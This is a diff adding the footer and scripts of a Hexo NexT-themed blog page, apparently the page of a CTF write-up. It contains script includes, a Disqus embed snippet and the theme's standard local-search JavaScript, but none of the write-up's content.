+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sakura</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://eternalsakura13.com/2019/07/16/qwb growupjs & wctf independence_day writeup/';
+          this.page.identifier = '2019/07/16/qwb growupjs & wctf independence_day writeup/';
+          this.page.title = 'qwb growupjs & wctf independence_day writeup';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
